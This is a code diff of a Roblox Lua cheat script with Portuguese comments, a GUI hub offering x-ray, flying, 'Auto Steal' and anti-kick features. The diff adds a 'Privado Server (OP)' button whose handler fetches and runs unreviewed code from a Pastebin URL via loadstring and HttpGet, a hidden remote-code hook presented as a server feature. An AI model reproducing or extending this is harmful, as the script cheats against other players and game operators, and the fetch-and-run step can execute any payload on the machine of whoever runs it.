@@ -1,7 +1,7 @@
 -- Caio_Hub V2.1 - GUI completo sem ícone
 -- LocalScript dentro de StarterGui ou PlayerGui
 
--- Services
+-- Serviços
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
@@ -35,8 +35,7 @@ local state = {
 	floor = false,
 	fly = false,
 	float = false,
-	auto = false,
-	fps = false
+	auto = false
 }
 
 -- Anti-Kick / Anti-Rejoin básico
@@ -65,21 +64,17 @@ local function clamp(v,a,b) return math.max(a,math.min(b,v)) end
 local function applyXray()
 	for _, obj in ipairs(Workspace:GetDescendants()) do
 		if obj:IsA("BasePart") then
-			if originalTransparencies[obj]==nil then
-				originalTransparencies[obj]=obj.Transparency
-			end
 			obj.Transparency = clamp(obj.Transparency+0.7,0,1)
 		end
 	end
 	Lighting.FogEnd=999999
 end
 local function removeXray()
-	for obj,trans in pairs(originalTransparencies) do
-		if obj and obj.Parent then
-			pcall(function() obj.Transparency = trans end)
+	for _, obj in ipairs(Workspace:GetDescendants()) do
+		if obj:IsA("BasePart") then
+			obj.Transparency = clamp(obj.Transparency-0.7,0,1)
 		end
 	end
-	originalTransparencies = {}
 	Lighting.FogEnd = originalFogEnd
 end
 
@@ -142,7 +137,7 @@ local flyBtn = createButton("Fly to Base",120)
 local floatBtn = createButton("Float UP",176)
 local markBtn = createButton("Mark Position",232)
 local autoBtn = createButton("Auto Steal",288)
-local fpsBtn = createButton("FPS Boost",344)
+local privadoBtn = createButton("Privado Server (OP)",344)
 
 -- 3rd Floor
 floorBtn.MouseButton1Click:Connect(function()
@@ -218,7 +213,9 @@ end)
 -- Mark Position
 markBtn.MouseButton1Click:Connect(function()
 	markedPosition = hrp.Position
-	markBtn.Visible = false
+	markBtn.Text = "Position Marked!"
+	wait(1)
+	markBtn.Text = "Mark Position : OFF"
 end)
 
 -- Auto Steal
@@ -247,26 +244,18 @@ autoBtn.MouseButton1Click:Connect(function()
 	end
 end)
 
--- FPS Boost
-fpsBtn.MouseButton1Click:Connect(function()
-	state.fps = not state.fps
-	if state.fps then
-		fpsBtn.Text="FPS Boost : ON"
-		fpsBtn.BackgroundColor3=Color3.fromRGB(0,255,128)
-		-- Remove acessórios e reduz gráficos
-		for _,acc in pairs(character:GetChildren()) do
-			if acc:IsA("Accessory") then acc:Destroy() end
-		end
-		Lighting.GlobalShadows=false
-		Lighting.FogEnd=100000
-		Lighting.Brightness=1
-	else
-		fpsBtn.Text="FPS Boost : OFF"
-		fpsBtn.BackgroundColor3=Color3.fromRGB(40,40,44)
-		Lighting.GlobalShadows=true
-		Lighting.FogEnd=originalFogEnd
-		Lighting.Brightness=2
-	end
+-- Privado Server (OP)
+privadoBtn.MouseButton1Click:Connect(function()
+	privadoBtn.Text = "Executando..."
+	privadoBtn.BackgroundColor3 = Color3.fromRGB(0,255,128)
+	task.wait(0.5)
+	pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/Ru4UQDpN"))()
+	end)
+	privadoBtn.Text = "Privado Server (OP) : OK"
+	task.wait(1)
+	privadoBtn.Text = "Privado Server (OP)"
+	privadoBtn.BackgroundColor3 = Color3.fromRGB(40,40,44)
 end)
 
 -- Anti bug: não cair abaixo do mapa
